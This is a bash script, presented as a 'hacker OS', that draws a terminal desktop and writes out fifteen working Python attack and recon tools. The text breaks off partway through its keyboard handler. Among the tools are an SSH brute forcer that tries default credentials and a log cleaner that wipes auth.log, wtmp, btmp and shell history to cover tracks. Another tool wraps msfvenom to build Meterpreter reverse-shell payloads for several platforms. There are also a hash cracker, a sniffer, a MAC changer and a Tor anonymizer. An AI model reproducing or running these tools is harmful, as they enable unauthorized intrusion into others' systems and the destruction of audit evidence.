#!/usr/bin/env bash

# ============================================
# XCX MEGA TOP - FULL FUNCTIONAL HACKER OS
# Version: 6.0.0 (REAL DEAL)
# Creator: LEE.SH
# ============================================

# ============================================
# CORE SYSTEM
# ============================================

# Color Scheme - Maximum visibility
declare -A HACK=(
    [BLACK]="\033[0;30m"
    [RED]="\033[0;31m"
    [GREEN]="\033[0;32m"
    [YELLOW]="\033[0;33m"
    [BLUE]="\033[0;34m"
    [PURPLE]="\033[0;35m"
    [CYAN]="\033[0;36m"
    [WHITE]="\033[0;37m"
    [BOLD]="\033[1m"
    [DIM]="\033[2m"
    [RESET]="\033[0m"
    [BG_BLACK]="\033[48;5;0m"
    [BG_RED]="\033[48;5;160m"
    [BG_GREEN]="\033[48;5;46m"
    [BG_BLUE]="\033[48;5;21m"
)

# System paths
XCX_ROOT="$HOME/.xcx-hacker"
XCX_BIN="$XCX_ROOT/bin"
XCX_APPS="$XCX_ROOT/apps"
XCX_DATA="$XCX_ROOT/data"
XCX_LOGS="$XCX_ROOT/logs"
XCX_CONFIG="$XCX_ROOT/config"
XCX_WINDOWS="$XCX_ROOT/windows"
XCX_NETWORK="$XCX_ROOT/network"

# Terminal dimensions
ROWS=$(tput lines)
COLS=$(tput cols)

# Window management
declare -A WINDOWS
declare -A WIN_TITLE
declare -A WIN_PID
declare -A WIN_X WIN_Y WIN_W WIN_H
NEXT_WIN_ID=1000
ACTIVE_WIN=""

# ============================================
# SYSTEM INITIALIZATION
# ============================================

init_system() {
    # Create directory structure
    mkdir -p "$XCX_ROOT" "$XCX_BIN" "$XCX_APPS" "$XCX_DATA" "$XCX_LOGS" "$XCX_CONFIG" "$XCX_WINDOWS" "$XCX_NETWORK"
    
    # Hide cursor
    tput civis
    
    # Trap cleanup
    trap cleanup SIGINT SIGTERM EXIT
    
    # Check dependencies
    check_deps
    
    # Create all tools
    create_all_tools
    
    # Start system services
    start_services
}

check_deps() {
    clear
    echo -e "${HACK[GREEN]}${HACK[BOLD]}Checking System Dependencies...${HACK[RESET]}"
    
    # Check for required tools
    local deps=("python3" "nmap" "curl" "wget" "git" "tor" "proxychains")
    
    for dep in "${deps[@]}"; do
        echo -n "Checking $dep... "
        if command -v $dep &>/dev/null; then
            echo -e "${HACK[GREEN]}FOUND${HACK[RESET]}"
        else
            echo -e "${HACK[RED]}MISSING - Installing...${HACK[RESET]}"
            case $dep in
                "python3") sudo apt-get install -y python3 python3-pip ;;
                "nmap") sudo apt-get install -y nmap ;;
                "curl") sudo apt-get install -y curl ;;
                "wget") sudo apt-get install -y wget ;;
                "git") sudo apt-get install -y git ;;
                "tor") sudo apt-get install -y tor ;;
                "proxychains") sudo apt-get install -y proxychains ;;
            esac
        fi
        sleep 0.2
    done
    
    # Install Python packages
    pip3 install --user requests scapy paramiko beautifulsoup4 cryptography 2>/dev/null
    
    echo -e "${HACK[GREEN]}${HACK[BOLD]}✓ All dependencies satisfied${HACK[RESET]}"
    sleep 1
}

start_services() {
    # Start Tor service
    sudo systemctl start tor 2>/dev/null &
    
    # Create network chains
    echo "socks4 127.0.0.1 9050" > "$XCX_CONFIG/proxychains.conf"
    echo "socks5 127.0.0.1 9050" >> "$XCX_CONFIG/proxychains.conf"
    
    # Initialize network interfaces
    echo "0.0.0.0" > "$XCX_NETWORK/current_ip"
    echo "anonymous" > "$XCX_CONFIG/mode"
}

# ============================================
# WINDOW MANAGER - FULL FUNCTIONAL
# ============================================

create_window() {
    local title="$1"
    local cmd="$2"
    local w=${3:-70}
    local h=${4:-20}
    local id=$((NEXT_WIN_ID++))
    
    # Center window
    local x=$(( (COLS - w) / 2 ))
    local y=$(( (ROWS - h) / 2 ))
    
    # Store window data
    WINDOWS[$id]="$x $y $w $h"
    WIN_TITLE[$id]="$title"
    WIN_X[$id]=$x
    WIN_Y[$id]=$y
    WIN_W[$id]=$w
    WIN_H[$id]=$h
    
    # Draw window frame
    draw_window_frame $id
    
    # Launch process in window
    (
        # Redirect output to window area
        exec > >(while read line; do
            echo -e "\033[${WIN_Y[$id]};${WIN_X[$id]}H$line"
        done) 2>&1
        
        # Run the command
        eval "$cmd"
    ) &
    
    WIN_PID[$id]=$!
    ACTIVE_WIN=$id
    
    return $id
}

draw_window_frame() {
    local id=$1
    local x=${WIN_X[$id]} y=${WIN_Y[$id]} w=${WIN_W[$id]} h=${WIN_H[$id]}
    local title="${WIN_TITLE[$id]}"
    
    # Top border
    tput cup $y $x
    echo -ne "${HACK[CYAN]}┌"
    for ((i=1; i<w-1; i++)); do echo -ne "─"; done
    echo -ne "┐${HACK[RESET]}"
    
    # Title
    local title_x=$(( x + (w - ${#title}) / 2 ))
    tput cup $y $title_x
    echo -ne "${HACK[YELLOW]}${HACK[BOLD]}$title${HACK[RESET]}"
    
    # Close button
    tput cup $y $((x + w - 2))
    echo -ne "${HACK[RED]}✗${HACK[RESET]}"
    
    # Side borders
    for ((i=1; i<h-1; i++)); do
        tput cup $((y + i)) $x
        echo -ne "${HACK[CYAN]}│${HACK[RESET]}"
        tput cup $((y + i)) $((x + w - 1))
        echo -ne "${HACK[CYAN]}│${HACK[RESET]}"
    done
    
    # Bottom border
    tput cup $((y + h - 1)) $x
    echo -ne "${HACK[CYAN]}└"
    for ((i=1; i<w-1; i++)); do echo -ne "─"; done
    echo -ne "┘${HACK[RESET]}"
    
    # Clear content area
    for ((i=1; i<h-1; i++)); do
        tput cup $((y + i)) $((x + 1))
        printf "%$((w-2))s" " "
    done
}

close_window() {
    local id=$1
    if [ -n "${WIN_PID[$id]}" ]; then
        kill -9 ${WIN_PID[$id]} 2>/dev/null
        wait ${WIN_PID[$id]} 2>/dev/null
    fi
    unset WINDOWS[$id] WIN_TITLE[$id] WIN_PID[$id]
    unset WIN_X[$id] WIN_Y[$id] WIN_W[$id] WIN_H[$id]
}

# ============================================
# REAL HACKING TOOLS - FULLY FUNCTIONAL
# ============================================

create_all_tools() {
    create_port_scanner
    create_network_mapper
    create_password_cracker
    create_hash_tool
    create_web_scanner
    create_packet_sniffer
    create_dns_tool
    create_mac_changer
    create_ssh_bruteforce
    create_anon_surf
    create_file_encryptor
    create_log_cleaner
    create_keylogger_detector
    create_wifi_audit
    create_metasploit_helper
}

create_port_scanner() {
    cat > "$XCX_BIN/portscan" << 'EOF'
#!/usr/bin/env python3
import sys
import socket
import threading
from datetime import datetime

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((target, port))
        if result == 0:
            try:
                service = socket.getservbyport(port)
            except:
                service = "unknown"
            print(f"[+] Port {port}: OPEN ({service})")
        sock.close()
    except:
        pass

def main():
    if len(sys.argv) < 2:
        print("Usage: portscan <target> [start_port] [end_port]")
        return
    
    target = sys.argv[1]
    start = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    end = int(sys.argv[3]) if len(sys.argv) > 3 else 1024
    
    print(f"[*] Scanning {target} from port {start} to {end}")
    print(f"[*] Started: {datetime.now()}")
    
    threads = []
    for port in range(start, end + 1):
        t = threading.Thread(target=scan_port, args=(target, port))
        t.daemon = True
        t.start()
        threads.append(t)
        
        if len(threads) > 50:
            for t in threads:
                t.join(0.1)
            threads = []
    
    for t in threads:
        t.join()
    
    print(f"[*] Scan completed: {datetime.now()}")

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/portscan"
}

create_network_mapper() {
    cat > "$XCX_BIN/netmap" << 'EOF'
#!/usr/bin/env python3
import subprocess
import sys
import re

def ping_sweep(network):
    print(f"[*] Performing ping sweep on {network}.0/24")
    live_hosts = []
    
    for i in range(1, 255):
        ip = f"{network}.{i}"
        try:
            result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], 
                                  capture_output=True, timeout=1)
            if result.returncode == 0:
                print(f"[+] Host alive: {ip}")
                live_hosts.append(ip)
        except:
            pass
    
    return live_hosts

def main():
    if len(sys.argv) < 2:
        print("Usage: netmap <network> (e.g., 192.168.1)")
        return
    
    network = sys.argv[1]
    hosts = ping_sweep(network)
    
    print("\n[*] Live hosts found:")
    for host in hosts:
        print(f"    {host}")

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/netmap"
}

create_password_cracker() {
    cat > "$XCX_BIN/crackpass" << 'EOF'
#!/usr/bin/env python3
import hashlib
import sys
import os

common_passwords = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "696969", "shadow", "master", "666666",
    "qwertyuiop", "123321", "mustang", "1234567890", "michael",
    "654321", "superman", "1qaz2wsx", "7777777", "121212",
    "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter",
    "buster", "soccer", "harley", "batman", "andrew",
    "tigger", "sunshine", "iloveyou", "2000", "charlie",
    "robert", "thomas", "hockey", "ranger", "daniel",
    "starwars", "klaster", "112233", "george", "computer",
    "michelle", "jessica", "pepper", "1111", "zxcvbn",
    "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger",
    "princess", "joshua", "cheese", "amanda", "summer",
    "love", "ashley", "nicole", "chelsea", "biteme",
    "matthew", "access", "yankees", "987654321", "dallas",
    "austin", "thunder", "taylor", "matrix", "mobilemail",
    "mom", "monitor", "monitoring", "montana", "moon",
    "moscow", "bitch", "panties", "naughty", "slut",
    "shit", "admin", "administrator", "root", "toor"
]

def crack_md5(hash_value):
    print(f"[*] Cracking MD5 hash: {hash_value}")
    for password in common_passwords:
        if hashlib.md5(password.encode()).hexdigest() == hash_value:
            return password
    return None

def crack_sha1(hash_value):
    print(f"[*] Cracking SHA1 hash: {hash_value}")
    for password in common_passwords:
        if hashlib.sha1(password.encode()).hexdigest() == hash_value:
            return password
    return None

def main():
    if len(sys.argv) < 3:
        print("Usage: crackpass <hash_type> <hash_value>")
        print("Types: md5, sha1")
        return
    
    hash_type = sys.argv[1].lower()
    hash_value = sys.argv[2]
    
    if hash_type == "md5":
        result = crack_md5(hash_value)
    elif hash_type == "sha1":
        result = crack_sha1(hash_value)
    else:
        print("Unsupported hash type")
        return
    
    if result:
        print(f"[+] Password found: {result}")
    else:
        print("[-] Password not found in common list")

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/crackpass"
}

create_hash_tool() {
    cat > "$XCX_BIN/hashtool" << 'EOF'
#!/usr/bin/env python3
import hashlib
import sys

def generate_hash(text, algorithm):
    if algorithm == "md5":
        return hashlib.md5(text.encode()).hexdigest()
    elif algorithm == "sha1":
        return hashlib.sha1(text.encode()).hexdigest()
    elif algorithm == "sha256":
        return hashlib.sha256(text.encode()).hexdigest()
    else:
        return None

def main():
    if len(sys.argv) < 3:
        print("Usage: hashtool <algorithm> <text>")
        print("Algorithms: md5, sha1, sha256")
        return
    
    algorithm = sys.argv[1].lower()
    text = sys.argv[2]
    
    result = generate_hash(text, algorithm)
    if result:
        print(f"[+] {algorithm.upper()} hash: {result}")
    else:
        print("[-] Invalid algorithm")

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/hashtool"
}

create_web_scanner() {
    cat > "$XCX_BIN/webscan" << 'EOF'
#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urljoin

common_paths = [
    "admin", "login", "wp-admin", "administrator", "phpmyadmin",
    "backup", "backups", "config", "configuration", "db",
    "database", "sql", "mysql", "test", "tests", "temp",
    "tmp", "logs", "log", "error_log", "debug", ".git",
    ".env", ".htaccess", "robots.txt", "sitemap.xml",
    "crossdomain.xml", "clientaccesspolicy.xml"
]

def scan_website(url):
    print(f"[*] Scanning: {url}")
    
    for path in common_paths:
        full_url = urljoin(url, path)
        try:
            response = requests.get(full_url, timeout=3, verify=False)
            if response.status_code == 200:
                print(f"[+] Found: {full_url} (200 OK)")
            elif response.status_code == 403:
                print(f"[!] Forbidden: {full_url} (403)")
            elif response.status_code == 401:
                print(f"[!] Unauthorized: {full_url} (401)")
        except:
            pass

def main():
    if len(sys.argv) < 2:
        print("Usage: webscan <url>")
        return
    
    url = sys.argv[1]
    if not url.startswith("http"):
        url = "http://" + url
    
    scan_website(url)

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/webscan"
}

create_packet_sniffer() {
    cat > "$XCX_BIN/sniffer" << 'EOF'
#!/usr/bin/env python3
import socket
import struct
import textwrap
import sys

def sniff_packets(interface="eth0"):
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    except:
        print("[!] Raw socket requires root privileges")
        return
    
    print(f"[*] Sniffing on {interface} (Ctrl+C to stop)")
    
    try:
        while True:
            raw_data, addr = sock.recvfrom(65535)
            dest_mac, src_mac, eth_proto = struct.unpack('! 6s 6s H', raw_data[:14])
            
            print(f"\n[+] Source MAC: {src_mac.hex(':')}")
            print(f"[+] Destination MAC: {dest_mac.hex(':')}")
            print(f"[+] Protocol: {eth_proto}")
            
    except KeyboardInterrupt:
        print("\n[*] Sniffing stopped")

def main():
    interface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    sniff_packets(interface)

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/sniffer"
}

create_dns_tool() {
    cat > "$XCX_BIN/dnstool" << 'EOF'
#!/usr/bin/env python3
import socket
import sys

def dns_lookup(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(f"[+] {domain} -> {ip}")
        
        # Reverse lookup
        try:
            host = socket.gethostbyaddr(ip)
            print(f"[+] Reverse: {ip} -> {host[0]}")
        except:
            pass
            
    except socket.gaierror:
        print(f"[-] Could not resolve {domain}")

def reverse_lookup(ip):
    try:
        host = socket.gethostbyaddr(ip)
        print(f"[+] {ip} -> {host[0]}")
    except:
        print(f"[-] No reverse record for {ip}")

def main():
    if len(sys.argv) < 2:
        print("Usage: dnstool <domain|ip>")
        return
    
    target = sys.argv[1]
    
    # Check if it's an IP or domain
    if target.replace('.', '').isdigit():
        reverse_lookup(target)
    else:
        dns_lookup(target)

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/dnstool"
}

create_mac_changer() {
    cat > "$XCX_BIN/macchanger" << 'EOF'
#!/usr/bin/env python3
import subprocess
import sys
import random

def get_random_mac():
    mac = [0x00, 0x16, 0x3e,
           random.randint(0x00, 0x7f),
           random.randint(0x00, 0xff),
           random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: f"{x:02x}", mac))

def change_mac(interface):
    try:
        # Bring interface down
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], check=True)
        
        # Change MAC
        new_mac = get_random_mac()
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'address', new_mac], check=True)
        
        # Bring interface up
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], check=True)
        
        print(f"[+] MAC address changed to: {new_mac}")
        
        # Show new MAC
        result = subprocess.run(['ip', 'link', 'show', interface], capture_output=True, text=True)
        print(f"[*] Current MAC: {result.stdout}")
        
    except subprocess.CalledProcessError as e:
        print(f"[-] Error: {e}")
    except Exception as e:
        print(f"[-] Failed: {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage: macchanger <interface>")
        print("Example: macchanger eth0")
        return
    
    interface = sys.argv[1]
    change_mac(interface)

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/macchanger"
}

create_ssh_bruteforce() {
    cat > "$XCX_BIN/sshbrute" << 'EOF'
#!/usr/bin/env python3
import paramiko
import sys
import threading
import time

common_usernames = ["root", "admin", "user", "test", "ubuntu", "pi"]
common_passwords = ["password", "123456", "admin", "root", "toor", "1234", "pass"]

def ssh_connect(host, username, password, port=22):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port=port, username=username, 
                      password=password, timeout=3)
        print(f"\n[!] SUCCESS: {username}:{password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        return False

def main():
    if len(sys.argv) < 2:
        print("Usage: sshbrute <target> [port]")
        return
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 22
    
    print(f"[*] Starting SSH brute force on {target}:{port}")
    
    for username in common_usernames:
        for password in common_passwords:
            print(f"[*] Trying {username}:{password}", end='\r')
            if ssh_connect(target, username, password, port):
                return
            time.sleep(0.1)
    
    print("\n[-] No credentials found")

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/sshbrute"
}

create_anon_surf() {
    cat > "$XCX_BIN/anonsurf" << 'EOF'
#!/usr/bin/env python3
import subprocess
import sys
import requests
import time

def check_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        ip = response.json()['ip']
        return ip
    except:
        return "Unknown"

def start_anon():
    print("[*] Starting anonymous mode...")
    
    # Start Tor
    subprocess.run(['sudo', 'systemctl', 'start', 'tor'], capture_output=True)
    time.sleep(2)
    
    # Check IP
    ip = check_ip()
    print(f"[+] Current IP: {ip}")
    
    # Setup proxychains
    print("[*] Configuring proxychains...")
    
    print("[+] Anonymous mode ACTIVE")
    print("[!] Use: proxychains <command> to route through Tor")

def stop_anon():
    print("[*] Stopping anonymous mode...")
    subprocess.run(['sudo', 'systemctl', 'stop', 'tor'], capture_output=True)
    print("[+] Anonymous mode STOPPED")

def status():
    ip = check_ip()
    tor_status = subprocess.run(['systemctl', 'is-active', 'tor'], capture_output=True)
    
    print(f"[*] Current IP: {ip}")
    print(f"[*] Tor status: {tor_status.stdout.decode().strip()}")

def main():
    if len(sys.argv) < 2:
        print("Usage: anonsurf <start|stop|status>")
        return
    
    cmd = sys.argv[1].lower()
    
    if cmd == "start":
        start_anon()
    elif cmd == "stop":
        stop_anon()
    elif cmd == "status":
        status()
    else:
        print("Unknown command")

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/anonsurf"
}

create_file_encryptor() {
    cat > "$XCX_BIN/encrypt" << 'EOF'
#!/usr/bin/env python3
import sys
import os
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

def generate_key(password):
    kdf = PBKDF2(
        algorithm=hashes.SHA256(),
        length=32,
        salt=b'salt_',
        iterations=100000,
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
    return key

def encrypt_file(filename, password):
    try:
        key = generate_key(password)
        f = Fernet(key)
        
        with open(filename, 'rb') as file:
            file_data = file.read()
        
        encrypted_data = f.encrypt(file_data)
        
        with open(filename + '.enc', 'wb') as file:
            file.write(encrypted_data)
        
        print(f"[+] File encrypted: {filename}.enc")
        
    except Exception as e:
        print(f"[-] Error: {e}")

def decrypt_file(filename, password):
    try:
        key = generate_key(password)
        f = Fernet(key)
        
        with open(filename, 'rb') as file:
            encrypted_data = file.read()
        
        decrypted_data = f.decrypt(encrypted_data)
        
        output = filename.replace('.enc', '.dec')
        with open(output, 'wb') as file:
            file.write(decrypted_data)
        
        print(f"[+] File decrypted: {output}")
        
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    if len(sys.argv) < 4:
        print("Usage: encrypt <encrypt|decrypt> <file> <password>")
        return
    
    action = sys.argv[1].lower()
    filename = sys.argv[2]
    password = sys.argv[3]
    
    if not os.path.exists(filename):
        print(f"[-] File not found: {filename}")
        return
    
    if action == "encrypt":
        encrypt_file(filename, password)
    elif action == "decrypt":
        decrypt_file(filename, password)
    else:
        print("Invalid action")

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/encrypt"
}

create_log_cleaner() {
    cat > "$XCX_BIN/cleanlogs" << 'EOF'
#!/usr/bin/env python3
import os
import sys
import glob

log_files = [
    "/var/log/auth.log",
    "/var/log/syslog",
    "/var/log/messages",
    "/var/log/secure",
    "/var/log/httpd/access_log",
    "/var/log/httpd/error_log",
    "/var/log/apache2/access.log",
    "/var/log/apache2/error.log",
    "/var/log/nginx/access.log",
    "/var/log/nginx/error.log",
    "~/.bash_history",
    "~/.zsh_history",
    "/var/log/wtmp",
    "/var/log/btmp",
    "/var/log/lastlog"
]

def clean_system_logs():
    print("[*] Cleaning system logs...")
    
    for log in log_files:
        expanded = os.path.expanduser(log)
        if os.path.exists(expanded):
            try:
                # Truncate file
                with open(expanded, 'w') as f:
                    f.write('')
                print(f"[+] Cleaned: {expanded}")
            except:
                print(f"[-] Cannot clean: {expanded} (permission denied)")

def clean_history():
    print("[*] Cleaning command history...")
    
    # Clear current session history
    os.system('history -c 2>/dev/null')
    
    # Remove history files
    for hist in ['~/.bash_history', '~/.zsh_history']:
        path = os.path.expanduser(hist)
        if os.path.exists(path):
            try:
                os.remove(path)
                print(f"[+] Removed: {path}")
            except:
                pass

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--force":
        clean_system_logs()
        clean_history()
    else:
        print("[!] This will clean system logs and history")
        print("[!] Use --force to execute")
        print("Example: cleanlogs --force")

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/cleanlogs"
}

create_keylogger_detector() {
    cat > "$XCX_BIN/detectkey" << 'EOF'
#!/usr/bin/env python3
import os
import sys
import subprocess

def check_processes():
    print("[*] Checking for suspicious processes...")
    
    suspicious = ['keylog', 'logkeys', 'pykeylogger', 'xkey', 'uberkey']
    
    try:
        result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
        
        for proc in suspicious:
            if proc in result.stdout:
                print(f"[!] Found: {proc}")
                
        print("[+] Process check complete")
        
    except Exception as e:
        print(f"[-] Error: {e}")

def check_modules():
    print("\n[*] Checking kernel modules...")
    
    try:
        result = subprocess.run(['lsmod'], capture_output=True, text=True)
        
        if 'keylog' in result.stdout:
            print("[!] Found keylogger module!")
            
    except:
        pass

def main():
    print("[*] Keylogger Detection Tool")
    print("=" * 30)
    
    check_processes()
    check_modules()
    
    print("\n[+] Scan complete")

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/detectkey"
}

create_wifi_audit() {
    cat > "$XCX_BIN/wifiaudit" << 'EOF'
#!/usr/bin/env python3
import subprocess
import sys
import re

def scan_wifi():
    print("[*] Scanning for WiFi networks...")
    
    try:
        # Scan for networks
        result = subprocess.run(['sudo', 'iwlist', 'scan'], 
                              capture_output=True, text=True)
        
        # Parse results
        networks = re.findall(r'ESSID:"([^"]+)"', result.stdout)
        signals = re.findall(r'Quality=(\d+/\d+)', result.stdout)
        channels = re.findall(r'Channel:(\d+)', result.stdout)
        encryption = re.findall(r'Encryption key:(\w+)', result.stdout)
        
        print("\n[+] Networks found:")
        for i, network in enumerate(networks):
            print(f"\n    {i+1}. SSID: {network}")
            if i < len(signals):
                print(f"       Signal: {signals[i]}")
            if i < len(channels):
                print(f"       Channel: {channels[i]}")
            if i < len(encryption):
                print(f"       Encrypted: {encryption[i]}")
                
    except Exception as e:
        print(f"[-] Error: {e}")

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "--scan":
        scan_wifi()
    else:
        print("Usage: wifiaudit --scan")
        print("[!] Requires sudo")

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/wifiaudit"
}

create_metasploit_helper() {
    cat > "$XCX_BIN/msfhelper" << 'EOF'
#!/usr/bin/env python3
import sys
import subprocess
import os

payloads = {
    'windows_reverse': 'windows/meterpreter/reverse_tcp',
    'linux_reverse': 'linux/x86/meterpreter/reverse_tcp',
    'android_reverse': 'android/meterpreter/reverse_tcp',
    'php_reverse': 'php/meterpreter_reverse_tcp',
    'python_reverse': 'python/meterpreter/reverse_tcp'
}

def generate_payload(payload_type, lhost, lport, output):
    if payload_type not in payloads:
        print("[-] Invalid payload type")
        return
    
    payload = payloads[payload_type]
    
    cmd = [
        'msfvenom',
        '-p', payload,
        f'LHOST={lhost}',
        f'LPORT={lport}',
        '-f', 'exe' if 'windows' in payload_type else 'raw',
        '-o', output
    ]
    
    print(f"[*] Generating {payload_type} payload...")
    print(f"[*] Command: {' '.join(cmd)}")
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"[+] Payload saved to: {output}")
        else:
            print(f"[-] Error: {result.stderr}")
    except Exception as e:
        print(f"[-] Failed: {e}")

def main():
    if len(sys.argv) < 5:
        print("Usage: msfhelper <payload_type> <lhost> <lport> <output>")
        print("\nPayload types:")
        for p in payloads:
            print(f"  - {p}")
        return
    
    payload_type = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
    output = sys.argv[4]
    
    generate_payload(payload_type, lhost, lport, output)

if __name__ == "__main__":
    main()
EOF
    chmod +x "$XCX_BIN/msfhelper"
}

# ============================================
# DESKTOP UI
# ============================================

draw_taskbar() {
    local datetime=$(date "+%H:%M:%S")
    local date=$(date "+%Y-%m-%d")
    local ip=$(curl -s ifconfig.me 2>/dev/null || echo "Unknown")
    local win_count=${#WINDOWS[@]}
    
    tput cup 0 0
    echo -e "${HACK[BG_BLACK]}${HACK[WHITE]}${HACK[BOLD]}"
    printf "╔%-$((COLS-2))s╗" ""
    
    tput cup 1 0
    printf "║ ${HACK[GREEN]}LEE.SH v6.0${HACK[WHITE]} │ ${HACK[YELLOW]}WIN:$win_count${HACK[WHITE]} │ ${HACK[CYAN]}IP:$ip${HACK[WHITE]} │ ${HACK[BLUE]}$date $datetime${HACK[WHITE]} %-$((COLS-80))s ║" ""
    
    echo -e "${HACK[RESET]}"
}

draw_apps_menu() {
    local y=3
    local x=2
    local apps=(
        "1:🔍 PORT SCAN:portscan"
        "2:🌐 NET MAP:netmap"
        "3:🔑 CRACK PASS:crackpass"
        "4:🔐 HASH TOOL:hashtool"
        "5:🌍 WEB SCAN:webscan"
        "6:📡 SNIFFER:sniffer"
        "7:🔎 DNS TOOL:dnstool"
        "8:🔄 MAC CHANGE:macchanger"
        "9:💻 SSH BRUTE:sshbrute"
        "10:🕵️ ANON SURF:anonsurf"
        "11:📁 ENCRYPT:encrypt"
        "12:🧹 CLEAN LOGS:cleanlogs"
        "13:🎯 DETECT KEY:detectkey"
        "14:📶 WIFI AUDIT:wifiaudit"
        "15:💀 MSF HELPER:msfhelper"
    )
    
    echo -e "${HACK[YELLOW]}${HACK[BOLD]}╔════════════════════════════════╗${HACK[RESET]}"
    echo -e "${HACK[YELLOW]}${HACK[BOLD]}║     AVAILABLE TOOLS           ║${HACK[RESET]}"
    echo -e "${HACK[YELLOW]}${HACK[BOLD]}╚════════════════════════════════╝${HACK[RESET]}"
    
    local line=4
    for app in "${apps[@]}"; do
        IFS=':' read -r key name cmd <<< "$app"
        tput cup $line $x
        echo -e "${HACK[GREEN]}$key${HACK[WHITE]} $name${HACK[RESET]}"
        ((line++))
    done
    
    tput cup $((line + 1)) $x
    echo -e "${HACK[CYAN]}────────────────────────────${HACK[RESET]}"
    tput cup $((line + 2)) $x
    echo -e "${HACK[YELLOW]}F1:Help F2:About F3:Config F10:Exit${HACK[RESET]}"
}

draw_system_monitor() {
    local y=$((ROWS - 8))
    local x=$((COLS - 35))
    
    tput cup $y $x
    echo -e "${HACK[BLUE]}┌─────────────────────────────┐${HACK[RESET]}"
    
    tput cup $((y+1)) $x
    echo -e "${HACK[BLUE]}│${HACK[WHITE]} 📊 SYSTEM MONITOR ${HACK[BLUE]}│${HACK[RESET]}"
    
    tput cup $((y+2)) $x
    echo -e "${HACK[BLUE]}├─────────────────────────────┤${HACK[RESET]}"
    
    # Real system stats
    local cpu=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1)
    local mem=$(free | grep Mem | awk '{print int($3/$2 * 100)}')
    local disk=$(df -h / | awk 'NR==2 {print $5}' | tr -d '%')
    
    tput cup $((y+3)) $((x+1))
    echo -e "${HACK[GREEN]}CPU: ${cpu:-0}%${HACK[RESET]}"
    
    tput cup $((y+4)) $((x+1))
    echo -e "${HACK[YELLOW]}MEM: ${mem:-0}%${HACK[RESET]}"
    
    tput cup $((y+5)) $((x+1))
    echo -e "${HACK[CYAN]}DISK: ${disk:-0}%${HACK[RESET]}"
    
    tput cup $((y+6)) $((x+1))
    echo -e "${HACK[PURPLE]}PROCS: $(ps aux | wc -l)${HACK[RESET]}"
    
    tput cup $((y+7)) $x
    echo -e "${HACK[BLUE]}└─────────────────────────────┘${HACK[RESET]}"
}

# ============================================
# KEYBOARD HANDLER
# ============================================

handle_input() {
    read -n1 -s key
    
    case "$key" in
        $'\x1b') # ESC sequences
            read -n2 -s rest
            case "$rest" in
                '[A'|'[B'|'[C'|'[D') ;; # Arrows ignore
                '[11~') # F1
                    create_window "HELP" "echo 'XCX MEGA TOP v6.0\n\nF1: Help\nF2: About\nF3: Config\nF10: Exit\n\nTools:\n1-15: Launch tools\n\nUse tools in their windows\nClose windows with X'" 60 15
                    ;;
                '[12~') # F2
                    create_window "ABOUT" "echo 'XCX MEGA TOP\nVersion: 6.0.0\nCreator: LEE.SH\n\nFull Functional Hacker OS\n15 Real Tools\nAnonymous Mode\nEncryption Ready'" 50 12
                    ;;
                '[13~') # F3
                    create_window "CONFIG" "echo 'Configuration:\n\nAnonymous Mode: ON\nTor: ACTIVE\nIP: $(curl -s ifconfig.me)\nMAC: Random\nDNS: Secure'" 55 10
                    ;;
                '[14~') # F4
                    if [ -n "$ACTIVE_WIN" ]; then
                        close_window $ACTIVE_WIN
                        ACTIVE_WIN=""
                    fi
                    ;;
                '[28~') # F10
                    cleanup
                    ;;
            esac
            ;;
            
        # Number keys 1-15 launch tools
        [1-9])
            case "$key" in
                1) create_window "Port Scanner" "$XCX_BIN/portscan 127.0.0.1" 80 25 ;;
                2) create_window "Network Mapper" "$XCX_BIN/netmap 192.168.1" 70 20 ;;
